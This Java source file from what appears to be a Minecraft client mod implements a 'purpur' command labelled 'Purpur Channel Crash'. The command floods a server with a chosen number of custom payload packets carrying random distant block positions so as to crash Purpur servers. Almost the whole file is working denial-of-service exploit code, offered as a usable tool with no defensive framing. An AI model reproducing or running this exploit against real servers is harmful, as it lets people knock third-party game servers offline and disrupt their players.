package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import io.github.spigotrce.paradiseclientfabric.packet.PurpurExploitPayloadPacket;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import io.github.spigotrce.paradiseclientfabric.Helper;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.random.Random;

public class PurpurExploitCommand extends Command {

    public PurpurExploitCommand(MinecraftClient minecraftClient) {
        super("purpur", "Purpur Channel Crash", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<CommandSource> build() {
        return literal(getName())
                .then(argument("packets", IntegerArgumentType.integer(1))
                        .executes(this::execute));
    }
    private int execute(CommandContext<CommandSource> ctx) {
        int packets = IntegerArgumentType.getInteger(ctx, "packets");
        Helper.printChatMessage("Sending %d packet(s)".formatted(packets));

        new Thread(() -> {
            Random random = Random.create();
            for (int i = 0; i < packets; i++) {
                long position = new BlockPos(
                        random.nextBetween(-30_000_000, 30_000_000),
                        random.nextBetween(250, 254),
                        random.nextBetween(-30_000_000, 30_000_000)
                ).asLong();

                Helper.sendPacket(new CustomPayloadC2SPacket(
                        new PurpurExploitPayloadPacket(position)
                ));
                try {
                    Thread.sleep(50);
                } catch (Exception ignored) {
                    Helper.printChatMessage("[CrashExploit] [PurpurExploit] Unable to sleep 50ms");
                }
            }
        }).start();

        return SINGLE_SUCCESS;
    }
}
